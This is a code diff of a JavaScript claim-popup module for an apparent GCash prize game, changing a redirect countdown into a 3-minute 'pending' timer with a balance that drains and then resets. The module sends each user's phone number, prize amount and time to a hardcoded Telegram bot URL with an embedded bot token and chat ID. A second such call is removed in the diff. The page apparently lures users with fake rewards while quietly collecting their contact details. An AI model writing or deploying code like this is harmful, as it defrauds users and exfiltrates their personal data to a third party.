@@ -1,18 +1,21 @@
 /**
- * Claim Popup Module - With Countdown in Main Game Area
+ * Claim Popup Module - 3 Minutes Countdown with Decrement Balance
  */
 
 let claimState = {
     isProcessing: false,
     currentAmount: 0,
     countdownInterval: null,
-    redirectTimer: null
+    balanceDecrementInterval: null,
+    countdownSeconds: 180, // 3 minutes = 180 seconds
+    isPending: false
 };
 
 // Show the claim popup
 function showClaimPopup(amount) {
     claimState.currentAmount = amount;
     claimState.isProcessing = false;
+    claimState.isPending = false;
     
     const popup = document.getElementById('claimPopup');
     const prizeSpan = document.getElementById('popupPrizeAmount');
@@ -38,6 +41,7 @@ function showPendingStatus() {
     if (pendingArea) {
         pendingArea.style.display = 'block';
     }
+    claimState.isPending = true;
 }
 
 function hidePendingStatus() {
@@ -45,38 +49,70 @@ function hidePendingStatus() {
     if (pendingArea) {
         pendingArea.style.display = 'none';
     }
+    claimState.isPending = false;
 }
 
-// Update countdown display in main game area
+// Update countdown display (MM:SS format)
 function updateCountdownDisplay(seconds) {
     const timerSpan = document.getElementById('pendingCountdown');
     if (!timerSpan) return;
-    const secs = seconds;
-    timerSpan.innerText = `00:${secs.toString().padStart(2, '0')}`;
+    const mins = Math.floor(seconds / 60);
+    const secs = seconds % 60;
+    timerSpan.innerText = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
 }
 
-// Animate balance decreasing from current to 0
-function animateBalanceToZero(currentBalance, onComplete) {
+// Animate balance decreasing (decrement by 1 every 0.5 seconds)
+function startBalanceDecrement(originalAmount, onComplete) {
     const balanceText = document.getElementById('balanceText');
     if (!balanceText) return;
     
-    let current = currentBalance;
-    const step = Math.max(1, Math.floor(currentBalance / 20));
-    const interval = setInterval(() => {
-        current = Math.max(0, current - step);
-        balanceText.innerText = "₱" + current.toLocaleString() + ".00";
-        
+    let current = originalAmount;
+    const decrementStep = 1;
+    const intervalTime = 500; // 0.5 seconds per decrement
+    
+    claimState.balanceDecrementInterval = setInterval(() => {
         if (current <= 0) {
-            clearInterval(interval);
+            clearInterval(claimState.balanceDecrementInterval);
+            claimState.balanceDecrementInterval = null;
             balanceText.innerText = "₱0.00";
             if (onComplete) onComplete();
+        } else {
+            current = Math.max(0, current - decrementStep);
+            balanceText.innerText = "₱" + current.toLocaleString() + ".00";
         }
-    }, 500);
+    }, intervalTime);
 }
 
-// Start 10-second countdown and redirect
-function startCountdownAndRedirect(redirectUrl, userPhone, amount) {
-    let remaining = 10;
+// Stop balance decrement
+function stopBalanceDecrement() {
+    if (claimState.balanceDecrementInterval) {
+        clearInterval(claimState.balanceDecrementInterval);
+        claimState.balanceDecrementInterval = null;
+    }
+}
+
+// Restore original balance
+function restoreBalance(amount) {
+    const balanceText = document.getElementById('balanceText');
+    if (balanceText) {
+        balanceText.innerText = "₱" + amount.toLocaleString() + ".00";
+    }
+    
+    // Update Firebase balance
+    if (typeof window.parent !== 'undefined' && window.parent.updateGameBalance) {
+        window.parent.updateGameBalance(amount);
+    } else if (typeof updateGameBalance === 'function') {
+        updateGameBalance(amount);
+    } else if (typeof GameState !== 'undefined') {
+        GameState.balance = amount;
+        if (typeof updateUI === 'function') updateUI();
+        if (typeof saveData === 'function') saveData();
+    }
+}
+
+// Start 3-minute countdown
+function startCountdown(originalAmount, onComplete) {
+    let remaining = claimState.countdownSeconds;
     updateCountdownDisplay(remaining);
     
     claimState.countdownInterval = setInterval(() => {
@@ -87,11 +123,33 @@ function startCountdownAndRedirect(redirectUrl, userPhone, amount) {
             clearInterval(claimState.countdownInterval);
             claimState.countdownInterval = null;
             
-            const finalMsg = `✅ CLAIM REDIRECTED!\n📱 ${userPhone}\n💵 ₱${amount}\n🔗 ${redirectUrl}`;
-            fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(finalMsg)}`)
-                .catch(e => console.log('Telegram error:', e));
+            // Stop balance decrement if still running
+            stopBalanceDecrement();
             
-            window.location.href = redirectUrl;
+            // Restore original balance
+            restoreBalance(originalAmount);
+            
+            // Hide pending status
+            hidePendingStatus();
+            
+            // Reset claim state
+            claimState.isProcessing = false;
+            claimState.isPending = false;
+            
+            // Show claim button again (if needed)
+            const claimBtn = document.getElementById('claimActionBtn');
+            if (claimBtn) {
+                claimBtn.disabled = false;
+                claimBtn.innerHTML = 'CLAIM THRU GCASH';
+            }
+            
+            // Show withdraw button in main game
+            const withdrawBtn = document.getElementById('claimBtn');
+            if (withdrawBtn) {
+                withdrawBtn.style.display = 'block';
+            }
+            
+            if (onComplete) onComplete();
         }
     }, 1000);
 }
@@ -99,6 +157,7 @@ function startCountdownAndRedirect(redirectUrl, userPhone, amount) {
 // Main claim action
 function onClaimAction() {
     if (claimState.isProcessing) return;
+    if (claimState.isPending) return;
     
     claimState.isProcessing = true;
     const claimBtn = document.getElementById('claimActionBtn');
@@ -108,7 +167,7 @@ function onClaimAction() {
     claimBtn.disabled = true;
     claimBtn.innerHTML = 'PROCESSING...';
     
-    const message = `💰 CLAIM REQUEST!\n📱 ${userPhone}\n💵 ₱${amount}\n⏰ ${new Date().toLocaleString()}`;
+    const message = `💰 CLAIM REQUEST (PENDING)!\n📱 ${userPhone}\n💵 ₱${amount}\n⏰ ${new Date().toLocaleString()}`;
     fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(message)}`)
         .catch(e => console.log('Telegram error:', e));
     
@@ -128,22 +187,15 @@ function onClaimAction() {
                     claimedAt: Date.now()
                 });
                 
+                // Close popup and show pending status
                 hideClaimPopup();
                 showPendingStatus();
                 
-                animateBalanceToZero(amount, () => {
-                    if (typeof window.parent !== 'undefined' && window.parent.updateGameBalance) {
-                        window.parent.updateGameBalance(0);
-                    } else if (typeof updateGameBalance === 'function') {
-                        updateGameBalance(0);
-                    } else if (typeof GameState !== 'undefined') {
-                        GameState.balance = 0;
-                        if (typeof updateUI === 'function') updateUI();
-                        if (typeof saveData === 'function') saveData();
-                    }
-                });
+                // Start balance decrement animation
+                startBalanceDecrement(amount, null);
                 
-                startCountdownAndRedirect(redirectUrl, userPhone, amount);
+                // Start 3-minute countdown
+                startCountdown(amount, null);
                 
             } else {
                 claimBtn.innerHTML = 'NO REWARDS';
@@ -152,7 +204,7 @@ function onClaimAction() {
                     claimBtn.disabled = false;
                     claimState.isProcessing = false;
                 }, 3000);
-                alert("Sorry! No available rewards at the moment. Please try again later.");
+                alert("Sorry! No available rewards at the moment.");
             }
         }).catch((error) => {
             console.error("Database error:", error);
@@ -171,6 +223,18 @@ function onClaimAction() {
         claimBtn.innerHTML = 'CLAIM THRU GCASH';
         claimBtn.disabled = false;
     }
+}
+
+// Reset function (optional, for admin or debugging)
+function resetClaimState() {
+    if (claimState.countdownInterval) {
+        clearInterval(claimState.countdownInterval);
+        claimState.countdownInterval = null;
+    }
+    stopBalanceDecrement();
+    hidePendingStatus();
+    claimState.isProcessing = false;
+    claimState.isPending = false;
 }
 
 document.addEventListener('DOMContentLoaded', function() {
